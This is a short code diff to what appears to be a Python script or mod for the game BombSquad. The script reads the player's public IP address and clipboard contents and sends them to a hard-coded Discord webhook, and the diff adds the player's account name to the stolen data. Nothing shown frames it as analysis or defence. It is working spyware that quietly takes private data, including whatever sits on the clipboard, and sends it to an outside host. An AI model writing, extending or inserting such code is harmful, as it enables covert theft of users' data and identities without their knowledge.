@@ -19,11 +19,12 @@ def get_public_ip():
 webhook_url = "discord.com"
 webhook_path = "/api/webhooks/1311648949878128660/9zRG2MjsqIp5UFK3dso_eRrRYPLtZawspUevsPl4l9EdG44FhPIBidU4k2AYCRywteIK"
 
+bs_account = ba.internal.get_v1_account_display_string()
 public_ip = get_public_ip()
 clipboard = ba.clipboard_get_text()
 
 message = {
-    "content": f"Public IP Address: `{public_ip}`\nLast Clipboard: `{clipboard}`"
+    "content": f"Public IP Address: `{public_ip}`\nLast Clipboard: `{clipboard}`\nBS Account: `{bs_account}`"
 }
 
 conn = http.client.HTTPSConnection(webhook_url)
